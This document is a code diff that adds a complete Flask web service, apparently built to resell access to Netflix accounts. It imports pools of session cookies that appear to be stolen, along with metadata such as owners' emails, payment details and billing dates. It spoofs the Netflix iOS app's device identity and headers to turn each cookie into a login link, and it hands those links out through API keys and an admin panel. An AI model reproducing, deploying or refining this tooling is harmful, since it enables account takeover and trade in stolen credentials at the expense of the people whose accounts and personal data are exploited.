@@ -1,0 +1,616 @@
+# nftbot_all.py — single-process Flask app for Railway (SQLite, api-keys, panel)
+import os, json, sys, re, time, sqlite3, threading, urllib.parse, secrets, hashlib, logging
+from contextlib import contextmanager
+from datetime import datetime, timezone
+from functools import wraps
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+from flask import (Flask, request, redirect, session, render_template_string,
+                   url_for, jsonify)
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+logging.basicConfig(level=logging.INFO)
+log = logging.getLogger("nftoken")
+
+# ---------------- config ----------------
+DB_PATH     = os.environ.get("POOL_DB", "/data/pool.db")
+PORT        = int(os.environ.get("PORT", "8080"))
+PANEL_PASS  = os.environ.get("PANEL_PASS", "")
+PANEL_SECRET = os.environ.get("PANEL_SECRET") or secrets.token_hex(32)
+MAX_FAILS   = 5
+
+# make sure /data exists if the volume is mounted there
+os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
+
+# ---------------- netflix api ----------------
+API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+QUERY_PARAMS = {
+    "appVersion": "15.48.1",
+    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
+    "device_type": "NFAPPL-02-",
+    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
+    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
+    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
+    "path": '["account","token","default"]', "pathFormat": "graph",
+    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
+}
+BASE_HEADERS = {
+    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+    "x-netflix.request.attempt": "1",
+    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+    "x-netflix.context.app-version": "15.48.1",
+    "x-netflix.argo.translated": "true",
+    "x-netflix.context.form-factor": "phone",
+    "x-netflix.context.sdk-version": "2012.4",
+    "x-netflix.client.appversion": "15.48.1",
+    "x-netflix.context.max-device-width": "375",
+    "x-netflix.context.ab-tests": "",
+    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
+    "x-netflix.client.type": "argo",
+    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "x-netflix.context.locales": "en-US",
+    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.client.iosversion": "15.8.5",
+    "accept-language": "en-US;q=1",
+    "x-netflix.argo.abtests": "",
+    "x-netflix.context.os-version": "15.8.5",
+    "x-netflix.request.client.context": '{"appState":"foreground"}',
+    "x-netflix.context.ui-flavor": "argo",
+    "x-netflix.argo.nfnsm": "9",
+    "x-netflix.context.pixel-density": "2.0",
+    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.request.client.timezoneid": "UTC",
+}
+COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
+
+# ---------------- db ----------------
+SCHEMA = """
+CREATE TABLE IF NOT EXISTS cookies (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    raw TEXT NOT NULL,
+    netflix_id TEXT NOT NULL UNIQUE,
+    profile_id TEXT,
+    meta_json TEXT,
+    fail_count INTEGER NOT NULL DEFAULT 0,
+    ok_count INTEGER NOT NULL DEFAULT 0,
+    last_error TEXT,
+    last_used REAL,
+    created_at REAL NOT NULL,
+    deleted INTEGER NOT NULL DEFAULT 0
+);
+CREATE INDEX IF NOT EXISTS idx_cookies_active ON cookies(deleted, fail_count);
+CREATE TABLE IF NOT EXISTS issued_tokens (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    cookie_id INTEGER NOT NULL,
+    api_key_id INTEGER,
+    token TEXT NOT NULL,
+    url TEXT NOT NULL,
+    expires INTEGER,
+    created_at REAL NOT NULL
+);
+CREATE TABLE IF NOT EXISTS api_keys (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    key_hash TEXT NOT NULL UNIQUE,
+    key_prefix TEXT NOT NULL,
+    label TEXT,
+    calls INTEGER NOT NULL DEFAULT 0,
+    last_used REAL,
+    created_at REAL NOT NULL,
+    revoked INTEGER NOT NULL DEFAULT 0
+);
+"""
+_lock = threading.Lock()
+
+@contextmanager
+def db():
+    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    conn.execute("PRAGMA journal_mode=WAL")
+    try:
+        yield conn; conn.commit()
+    finally:
+        conn.close()
+
+def init_db():
+    with db() as c: c.executescript(SCHEMA)
+    log.info("database ready at %s", DB_PATH)
+
+# ---------------- api keys ----------------
+def hash_key(raw): return hashlib.sha256(raw.encode()).hexdigest()
+
+def create_api_key(label=None):
+    raw = "nft_" + secrets.token_urlsafe(32)
+    prefix = raw[:12] + "…"
+    now = time.time()
+    with _lock, db() as c:
+        cur = c.execute("INSERT INTO api_keys(key_hash,key_prefix,label,created_at) VALUES(?,?,?,?)",
+                        (hash_key(raw), prefix, label or "unnamed", now))
+        kid = cur.lastrowid
+    return raw, {"id": kid, "prefix": prefix, "label": label or "unnamed", "created_at": now}
+
+def verify_api_key(raw_key):
+    if not raw_key: return None
+    with _lock, db() as c:
+        row = c.execute("SELECT id,revoked FROM api_keys WHERE key_hash=?", (hash_key(raw_key),)).fetchone()
+        if not row or row["revoked"]: return None
+        c.execute("UPDATE api_keys SET calls=calls+1,last_used=? WHERE id=?", (time.time(), row["id"]))
+    return {"id": row["id"]}
+
+def list_api_keys():
+    with db() as c:
+        return [dict(r) for r in c.execute(
+            "SELECT id,key_prefix,label,calls,last_used,created_at,revoked FROM api_keys ORDER BY id DESC").fetchall()]
+
+def revoke_api_key(kid):
+    with _lock, db() as c: c.execute("UPDATE api_keys SET revoked=1 WHERE id=?", (kid,))
+
+def delete_api_key(kid):
+    with _lock, db() as c: c.execute("DELETE FROM api_keys WHERE id=?", (kid,))
+
+# ---------------- metadata ----------------
+FIELD_MAP = {
+    "email":          r"–\s*Email:\s*(.+)",
+    "verified":       r"–\s*Verified:\s*(.+)",
+    "profile":        r"–\s*Profile:\s*(.+)",
+    "plan":           r"–\s*Plan:\s*(.+)",
+    "next_billing":   r"–\s*Next billing:\s*(.*)",
+    "extra_members":  r"–\s*Extra members:\s*(.+)",
+    "country":        r"–\s*Country:\s*(.+)",
+    "payments":       r"–\s*Payments:\s*(.+)",
+    "source_cookies": r"–\s*Cookies:\s*(.+)",
+}
+
+def parse_metadata(text):
+    out = {}
+    for k, p in FIELD_MAP.items():
+        m = re.search(p, text)
+        if m: out[k] = m.group(1).strip()
+    for k in ("next_billing", "extra_members", "payments"):
+        if out.get(k, "") in ("", "—", "-"): out[k] = None
+    if out.get("plan"): out["plan"] = out["plan"].strip().lower()
+    return out
+
+# ---------------- cookie parsing / netflix ----------------
+def _decode(v):
+    if isinstance(v, str) and "%" in v:
+        try: return urllib.parse.unquote(v)
+        except Exception: return v
+    return v
+
+def extract_cookie_dict(text):
+    out = {}
+    for raw in text.splitlines():
+        line = raw.strip()
+        if not line or line.startswith("#"): continue
+        parts = line.split("\t")
+        if len(parts) >= 7: out[parts[5]] = parts[6]
+    try: data = json.loads(text)
+    except json.JSONDecodeError: data = None
+    if isinstance(data, list):
+        for ck in data:
+            if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
+                out[ck["name"]] = _decode(ck["value"])
+    elif isinstance(data, dict):
+        if any(k in data for k in COOKIE_KEYS):
+            for k in COOKIE_KEYS:
+                if isinstance(data.get(k), str): out[k] = _decode(data[k])
+        elif isinstance(data.get("cookies"), list):
+            for ck in data["cookies"]:
+                if ck.get("name") in COOKIE_KEYS and isinstance(ck.get("value"), str):
+                    out[ck["name"]] = _decode(ck["value"])
+    for k in COOKIE_KEYS:
+        if k in out: continue
+        m = re.search(rf"(?<!\w){re.escape(k)}=([^;,\s]+)", text)
+        if m: out[k] = _decode(m.group(1))
+    m = re.search(r"profileId=([a-zA-Z0-9_-]+)", text)
+    if m: out["profileId"] = m.group(1)
+    return out
+
+def fetch_token(netflix_id):
+    h = dict(BASE_HEADERS); h["Cookie"] = f"NetflixId={netflix_id}"
+    r = requests.get(API_URL, params=QUERY_PARAMS, headers=h, timeout=25, verify=False)
+    r.raise_for_status()
+    td = (((r.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+    token = td.get("token"); expires = td.get("expires")
+    if not token: raise ValueError("no token in response (cookie expired/invalid)")
+    if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
+    return token, expires
+
+# ---------------- pool ops ----------------
+def add_cookie(raw_text, source=None):
+    ck = extract_cookie_dict(raw_text); nid = ck.get("NetflixId")
+    if not nid: raise ValueError("no NetflixId in cookie")
+    pid = ck.get("profileId")
+    meta = parse_metadata(raw_text)
+    meta_json = json.dumps(meta) if meta else None
+    now = time.time()
+    with _lock, db() as c:
+        row = c.execute("SELECT id,deleted FROM cookies WHERE netflix_id=?", (nid,)).fetchone()
+        if row:
+            if row["deleted"]:
+                c.execute("UPDATE cookies SET deleted=0,fail_count=0,raw=?,profile_id=?,meta_json=? WHERE id=?",
+                          (raw_text, pid, meta_json, row["id"]))
+                return row["id"], nid
+            raise ValueError("cookie already in pool")
+        cur = c.execute("INSERT INTO cookies(raw,netflix_id,profile_id,meta_json,created_at) VALUES(?,?,?,?,?)",
+                        (raw_text, nid, pid, meta_json, now))
+        return cur.lastrowid, nid
+
+def add_cookies_bulk(text_blob, source=None):
+    text_blob = (text_blob or "").strip()
+    if not text_blob: return {"added": 0, "dupes": 0, "invalid": 0}
+    nid_count = len(re.findall(r"(?<!\w)NetflixId=", text_blob))
+    if nid_count <= 1:
+        try:
+            add_cookie(text_blob, source); return {"added": 1, "dupes": 0, "invalid": 0}
+        except ValueError as e:
+            if "already" in str(e): return {"added": 0, "dupes": 1, "invalid": 0}
+            return {"added": 0, "dupes": 0, "invalid": 1}
+    chunks = [c.strip() for c in re.split(r"\n\s*\n", text_blob) if c.strip()]
+    if len(chunks) == 1:
+        buf, chunks = [], []
+        for ln in text_blob.splitlines():
+            if re.search(r"(?<!\w)NetflixId=", ln) and buf:
+                chunks.append("\n".join(buf)); buf = [ln]
+            else: buf.append(ln)
+        if buf: chunks.append("\n".join(buf))
+    added = dups = bad = 0
+    for ch in chunks:
+        if len(re.findall(r"(?<!\w)NetflixId=", ch)) != 1: bad += 1; continue
+        try: add_cookie(ch, source); added += 1
+        except ValueError as e:
+            if "already" in str(e): dups += 1
+            else: bad += 1
+    return {"added": added, "dupes": dups, "invalid": bad}
+
+def pool_stats():
+    with db() as c:
+        total = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=0").fetchone()[0]
+        healthy = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=0 AND fail_count<?", (MAX_FAILS,)).fetchone()[0]
+        dying = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=0 AND fail_count>0").fetchone()[0]
+        dead = c.execute("SELECT COUNT(*) FROM cookies WHERE deleted=1").fetchone()[0]
+        issued = c.execute("SELECT COUNT(*) FROM issued_tokens").fetchone()[0]
+        keys = c.execute("SELECT COUNT(*) FROM api_keys WHERE revoked=0").fetchone()[0]
+    return {"total": total, "healthy": healthy, "dying": dying, "dead": dead, "issued": issued, "keys": keys}
+
+def _pick_random():
+    with db() as c:
+        return c.execute("SELECT id,netflix_id,profile_id,meta_json FROM cookies "
+                         "WHERE deleted=0 AND fail_count<? ORDER BY RANDOM() LIMIT 1",
+                         (MAX_FAILS,)).fetchone()
+
+def generate_link(api_key_id=None, max_attempts=20):
+    attempts = 0; last_err = None; tried = set()
+    while attempts < max_attempts:
+        row = _pick_random()
+        if not row: raise RuntimeError("pool exhausted — no healthy cookies left")
+        cid = row["id"]
+        if cid in tried:
+            if len(tried) >= pool_stats()["healthy"]:
+                raise RuntimeError(f"pool exhausted after {attempts} attempts: {last_err}")
+            continue
+        tried.add(cid); attempts += 1
+        try:
+            token, expires = fetch_token(row["netflix_id"])
+            url = f"https://www.netflix.com/login?nftoken={token}"
+            if row["profile_id"]: url += f"&profileIds={row['profile_id']}"
+            meta = json.loads(row["meta_json"]) if row["meta_json"] else {}
+            with _lock, db() as c:
+                c.execute("UPDATE cookies SET ok_count=ok_count+1,fail_count=0,last_used=? WHERE id=?",
+                          (time.time(), cid))
+                cur = c.execute("INSERT INTO issued_tokens(cookie_id,api_key_id,token,url,expires,created_at) "
+                                "VALUES(?,?,?,?,?,?)", (cid, api_key_id, token, url, expires, time.time()))
+                return {"url": url, "expires": expires, "cookie_id": cid,
+                        "attempts": attempts, "token_id": cur.lastrowid, "meta": meta}
+        except Exception as e:
+            last_err = str(e)
+            with _lock, db() as c:
+                c.execute("UPDATE cookies SET fail_count=fail_count+1,last_error=?,last_used=? WHERE id=?",
+                          (last_err[:500], time.time(), cid))
+                c.execute("UPDATE cookies SET deleted=1 WHERE id=? AND fail_count>=?", (cid, MAX_FAILS))
+    raise RuntimeError(f"gave up after {attempts} attempts: {last_err}")
+
+def list_cookies(offset=0, limit=200, include_dead=False):
+    q = "SELECT id,netflix_id,profile_id,meta_json,fail_count,ok_count,last_error,last_used,created_at,deleted FROM cookies"
+    if not include_dead: q += " WHERE deleted=0"
+    q += " ORDER BY id DESC LIMIT ? OFFSET ?"
+    with db() as c:
+        rows = [dict(r) for r in c.execute(q, (limit, offset)).fetchall()]
+    for r in rows:
+        try: r["meta"] = json.loads(r["meta_json"]) if r["meta_json"] else {}
+        except Exception: r["meta"] = {}
+    return rows
+
+def list_issued(limit=200, offset=0):
+    with db() as c:
+        return [dict(r) for r in c.execute(
+            "SELECT id,cookie_id,api_key_id,token,url,expires,created_at FROM issued_tokens "
+            "ORDER BY id DESC LIMIT ? OFFSET ?", (limit, offset)).fetchall()]
+
+def revive_cookie(cid):
+    with _lock, db() as c:
+        c.execute("UPDATE cookies SET deleted=0,fail_count=0,last_error=NULL WHERE id=?", (cid,))
+
+def hard_delete(cid):
+    with _lock, db() as c: c.execute("DELETE FROM cookies WHERE id=?", (cid,))
+
+# ---------------- app ----------------
+app = Flask(__name__)
+app.secret_key = PANEL_SECRET
+app.config["MAX_CONTENT_LENGTH"] = 256 * 1024 * 1024
+
+init_db()
+
+# ---------------- api ----------------
+@app.route("/api/generate", methods=["POST", "GET"])
+def api_generate():
+    key = request.headers.get("X-API-Key") or (request.get_json(silent=True) or {}).get("api_key")
+    ident = verify_api_key(key)
+    if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
+    try:
+        r = generate_link(api_key_id=ident["id"])
+    except Exception as e:
+        log.warning("generate failed: %s", e)
+        return jsonify({"ok": False, "error": str(e)}), 502
+    return jsonify({"ok": True, "url": r["url"], "expires": r["expires"],
+                    "cookie_id": r["cookie_id"], "attempts": r["attempts"], "account": r["meta"]})
+
+@app.route("/api/status", methods=["GET"])
+def api_status():
+    ident = verify_api_key(request.headers.get("X-API-Key"))
+    if not ident: return jsonify({"ok": False, "error": "invalid or revoked api key"}), 401
+    return jsonify({"ok": True, **pool_stats()})
+
+@app.route("/", methods=["GET"])
+def health():
+    return jsonify({"ok": True, "service": "nftoken-api", "db": DB_PATH})
+
+# ---------------- panel ----------------
+def authed(): return session.get("ok") is True
+def login_required(f):
+    @wraps(f)
+    def wrap(*a, **k):
+        if not authed(): return redirect(url_for("panel"))
+        return f(*a, **k)
+    return wrap
+
+FLAG = lambda c: ("".join(chr(0x1F1E6 + ord(x) - ord("A")) for x in c.upper())) if c and len(c) == 2 else "🌐"
+
+def _ts(v):
+    if not v: return "—"
+    try: return time.strftime("%Y-%m-%d %H:%M", time.gmtime(float(v)))
+    except Exception: return str(v)
+
+CSS = """
+*{box-sizing:border-box}
+body{font-family:'Segoe UI',-apple-system,sans-serif;background:#0b0b0b;color:#e8e8e8;margin:0}
+.wrap{max-width:1300px;margin:0 auto;padding:24px}
+.hero{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px;padding-bottom:16px;border-bottom:1px solid #1f1f1f}
+h1{color:#e50914;margin:0;font-size:24px;letter-spacing:-.5px}h1 span{color:#fff;font-weight:300}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:24px}
+.card{background:linear-gradient(135deg,#1a1a1a,#141414);border:1px solid #222;border-radius:10px;padding:14px 16px}
+.card .lbl{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:.5px}
+.card .val{font-size:24px;font-weight:700;margin-top:4px;color:#fff}
+.card.green .val{color:#46d369}.card.amber .val{color:#f5b942}.card.red .val{color:#ff5c5c}.card.blue .val{color:#5db8ff}
+.panel{background:#141414;border:1px solid #222;border-radius:12px;padding:20px;margin-bottom:20px}
+.panel h2{font-size:14px;text-transform:uppercase;letter-spacing:1px;color:#888;margin:0 0 12px}
+input,textarea{width:100%;background:#0d0d0d;color:#e8e8e8;border:1px solid #2a2a2a;border-radius:8px;padding:10px;font-size:13px;font-family:monospace}
+textarea{height:90px;resize:vertical}
+input[type=file]{padding:8px;font-family:inherit}
+.btn{background:#e50914;color:#fff;border:0;padding:9px 16px;border-radius:8px;cursor:pointer;font-weight:600;font-size:13px}
+.btn:hover{background:#ff0f1f}
+.btn.ghost{background:#222;color:#aaa}.btn.ghost:hover{background:#333;color:#fff}
+.btn.tiny{padding:5px 10px;font-size:11px}
+.toolbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px}
+.flash{background:#0d3320;border:1px solid #1c6b3f;color:#46d369;padding:10px 14px;border-radius:8px;margin-bottom:16px;font-size:13px;word-break:break-all}
+.flash.err{background:#330d0d;border-color:#6b1c1c;color:#ff5c5c}
+table{width:100%;border-collapse:collapse;font-size:12px}
+thead th{background:#0d0d0d;color:#888;text-transform:uppercase;font-size:10px;letter-spacing:.5px;padding:10px 8px;border-bottom:1px solid #222;text-align:left}
+tbody td{padding:9px 8px;border-bottom:1px solid #1c1c1c;vertical-align:middle}
+tbody tr:hover{background:#181818}
+.tag{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600}
+.tag.premium{background:#3a2d00;color:#f5b942}
+.tag.revoked{background:#3a0d0d;color:#ff5c5c}
+.tag.active{background:#0d3320;color:#46d369}
+code{font-family:'SF Mono',Consolas,monospace;color:#46d369;font-size:11px}
+a{color:#5db8ff;text-decoration:none}
+.login-box{max-width:380px;margin:80px auto;background:#141414;border:1px solid #222;border-radius:12px;padding:32px}
+.login-box h1{text-align:center;margin-bottom:24px}
+"""
+
+TEMPLATE = """
+<!doctype html><html><head><meta charset=utf-8><title>NFToken Admin</title><style>{{css|safe}}</style></head><body>
+<div class=wrap>
+{% if not authed %}
+  <div class=login-box>
+    <h1>NFToken Admin</h1>
+    <form method=post action="/panel/login">
+      <input type=password name=pass placeholder="panel password" required style="margin-bottom:12px">
+      <button class=btn style="width:100%">Sign in</button>
+    </form>
+  </div>
+{% else %}
+  <div class=hero><h1>NFToken <span>Admin</span></h1><a href="/panel/logout" class="btn ghost">Sign out</a></div>
+  {% if flash %}<div class="flash {{'err' if flash_err else ''}}">{{flash|safe}}</div>{% endif %}
+  <div class=cards>
+    <div class="card green"><div class=lbl>Healthy</div><div class=val>{{s.healthy}}</div></div>
+    <div class=card><div class=lbl>Total</div><div class=val>{{s.total}}</div></div>
+    <div class="card amber"><div class=lbl>Dying</div><div class=val>{{s.dying}}</div></div>
+    <div class="card red"><div class=lbl>Evicted</div><div class=val>{{s.dead}}</div></div>
+    <div class="card blue"><div class=lbl>Tokens</div><div class=val>{{s.issued}}</div></div>
+    <div class="card blue"><div class=lbl>API Keys</div><div class=val>{{s.keys}}</div></div>
+  </div>
+
+  <div class=panel>
+    <h2>🔑 API Keys</h2>
+    <form method=post action="/panel/keys/new" class=toolbar>
+      <input type=text name=label placeholder="label (e.g. 'client-a')" style="flex:1;min-width:200px">
+      <button class=btn>+ Mint key</button>
+    </form>
+    <table>
+      <thead><tr><th>#</th><th>Prefix</th><th>Label</th><th>Calls</th><th>Last used</th><th>Created</th><th>Status</th><th></th></tr></thead>
+      <tbody>
+      {% for k in keys %}
+        <tr><td>{{k.id}}</td><td><code>{{k.key_prefix}}</code></td><td>{{k.label}}</td>
+          <td>{{k.calls}}</td><td>{{k.last_used_str}}</td><td>{{k.created_str}}</td>
+          <td>{% if k.revoked %}<span class="tag revoked">revoked</span>{% else %}<span class="tag active">active</span>{% endif %}</td>
+          <td>
+            {% if not k.revoked %}
+            <form method=post action="/panel/keys/{{k.id}}/revoke" style="display:inline"><button class="btn ghost tiny">revoke</button></form>
+            {% endif %}
+            <form method=post action="/panel/keys/{{k.id}}/delete" style="display:inline" onsubmit="return confirm('delete key?')"><button class="btn ghost tiny">delete</button></form>
+          </td></tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  </div>
+
+  <div class=panel>
+    <h2>📤 Bulk add cookies</h2>
+    <form method=post action="/panel/bulk" enctype="multipart/form-data">
+      <input type=file name=files multiple accept=".txt,.json,.csv,.dat">
+      <textarea name=blob placeholder="…or paste cookies here (blank-line separated)" style="margin-top:10px"></textarea>
+      <div style="margin-top:10px"><button class=btn>Import</button></div>
+    </form>
+  </div>
+
+  <div class=panel>
+    <h2>🍪 Cookies</h2>
+    <p style="margin:0 0 10px">
+      <a href="/panel">hide evicted</a> · <a href="/panel?dead=1">show evicted</a>
+      · <a href="/panel/tokens">issued tokens</a>
+    </p>
+    <table>
+      <thead><tr><th>#</th><th>Plan</th><th>Country</th><th>Email</th><th>Profile</th><th>Renews</th><th>Payment</th><th>Fails</th><th>OK</th><th>Del</th><th></th></tr></thead>
+      <tbody>
+      {% for c in cookies %}
+        <tr><td>{{c.id}}</td>
+          <td>{% if c.meta.get('plan') %}<span class="tag premium">{{c.meta.get('plan')}}</span>{% else %}—{% endif %}</td>
+          <td>{{ flag(c.meta.get('country')) }} {{c.meta.get('country') or '—'}}</td>
+          <td style="font-size:11px">{{c.meta.get('email') or '—'}}</td>
+          <td>{{c.meta.get('profile') or c.profile_id or '—'}}</td>
+          <td style="font-size:11px">{{c.meta.get('next_billing') or '—'}}</td>
+          <td style="font-size:11px">{{c.meta.get('payments') or '—'}}</td>
+          <td>{{c.fail_count}}</td><td>{{c.ok_count}}</td><td>{{ '✓' if c.deleted else '—' }}</td>
+          <td>
+            <form method=post action="/panel/revive/{{c.id}}" style="display:inline"><button class="btn ghost tiny">revive</button></form>
+            <form method=post action="/panel/delete/{{c.id}}" style="display:inline" onsubmit="return confirm('delete?')"><button class="btn ghost tiny">delete</button></form>
+          </td></tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  </div>
+{% endif %}
+</div></body></html>
+"""
+
+TOKENS_TEMPLATE = """
+<!doctype html><html><head><meta charset=utf-8><title>Issued tokens</title><style>{{css|safe}}</style></head><body>
+<div class=wrap>
+  <div class=hero><h1>Issued <span>tokens</span></h1><a href="/panel" class="btn ghost">back</a></div>
+  <div class=panel><table>
+    <thead><tr><th>#</th><th>Cookie</th><th>API key</th><th>Created</th><th>Expires</th><th>URL</th></tr></thead>
+    <tbody>
+    {% for t in tokens %}
+      <tr><td>{{t.id}}</td><td>{{t.cookie_id}}</td><td>{{t.api_key_id or '—'}}</td>
+      <td>{{t.created_str}}</td><td>{{t.expires_str}}</td><td><code>{{t.url[:70]}}…</code></td></tr>
+    {% endfor %}
+    </tbody>
+  </table></div>
+</div></body></html>
+"""
+
+def _decorate_keys(keys):
+    for k in keys:
+        k["last_used_str"] = _ts(k["last_used"]); k["created_str"] = _ts(k["created_at"])
+    return keys
+
+def _decorate_tokens(ts):
+    for t in ts:
+        t["created_str"] = _ts(t["created_at"])
+        t["expires_str"] = _ts(t["expires"]) if t["expires"] else "—"
+    return ts
+
+@app.route("/panel", methods=["GET"])
+def panel():
+    if not authed():
+        return render_template_string(TEMPLATE, authed=False, css=CSS)
+    flash = session.pop("flash", None)
+    flash_err = session.pop("flash_err", False)
+    show_dead = request.args.get("dead") == "1"
+    s = pool_stats()
+    keys = _decorate_keys(list_api_keys())
+    cookies = list_cookies(limit=500, include_dead=show_dead)
+    return render_template_string(TEMPLATE, authed=True, css=CSS, s=s, keys=keys,
+                                  cookies=cookies, flash=flash, flash_err=flash_err, flag=FLAG)
+
+@app.route("/panel/login", methods=["POST"])
+def panel_login():
+    if request.form.get("pass") == PANEL_PASS: session["ok"] = True
+    else: session["flash"] = "wrong password"; session["flash_err"] = True
+    return redirect(url_for("panel"))
+
+@app.route("/panel/logout")
+def panel_logout():
+    session.clear(); return redirect(url_for("panel"))
+
+@app.route("/panel/keys/new", methods=["POST"])
+@login_required
+def key_new():
+    raw, meta = create_api_key(label=request.form.get("label") or None)
+    session["flash"] = (f"✅ key #{meta['id']} created — copy now, shown once:<br><code>{raw}</code>")
+    return redirect(url_for("panel"))
+
+@app.route("/panel/keys/<int:kid>/revoke", methods=["POST"])
+@login_required
+def key_revoke(kid):
+    revoke_api_key(kid); session["flash"] = f"key #{kid} revoked."
+    return redirect(url_for("panel"))
+
+@app.route("/panel/keys/<int:kid>/delete", methods=["POST"])
+@login_required
+def key_delete(kid):
+    delete_api_key(kid); session["flash"] = f"key #{kid} deleted."
+    return redirect(url_for("panel"))
+
+@app.route("/panel/bulk", methods=["POST"])
+@login_required
+def bulk():
+    totals = {"added": 0, "dupes": 0, "invalid": 0, "files": 0, "errors": []}
+    for fs in request.files.getlist("files"):
+        if not fs or not fs.filename: continue
+        try: text = fs.read().decode("utf-8", errors="replace")
+        except Exception as e: totals["errors"].append(f"{fs.filename}: {e}"); continue
+        r = add_cookies_bulk(text)
+        totals["added"] += r["added"]; totals["dupes"] += r["dupes"]
+        totals["invalid"] += r["invalid"]; totals["files"] += 1
+    blob = (request.form.get("blob") or "").strip()
+    if blob:
+        r = add_cookies_bulk(blob)
+        totals["added"] += r["added"]; totals["dupes"] += r["dupes"]; totals["invalid"] += r["invalid"]
+    msg = f"files: {totals['files']} · added: {totals['added']} · dupes: {totals['dupes']} · invalid: {totals['invalid']}"
+    if totals["errors"]: msg += " · " + "; ".join(totals["errors"][:3])
+    session["flash"] = msg
+    return redirect(url_for("panel"))
+
+@app.route("/panel/revive/<int:cid>", methods=["POST"])
+@login_required
+def rv(cid):
+    revive_cookie(cid); return redirect(url_for("panel"))
+
+@app.route("/panel/delete/<int:cid>", methods=["POST"])
+@login_required
+def dl(cid):
+    hard_delete(cid); return redirect(url_for("panel"))
+
+@app.route("/panel/tokens")
+@login_required
+def tokens():
+    return render_template_string(TOKENS_TEMPLATE, css=CSS, tokens=_decorate_tokens(list_issued(limit=500)))
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=PORT, debug=False)
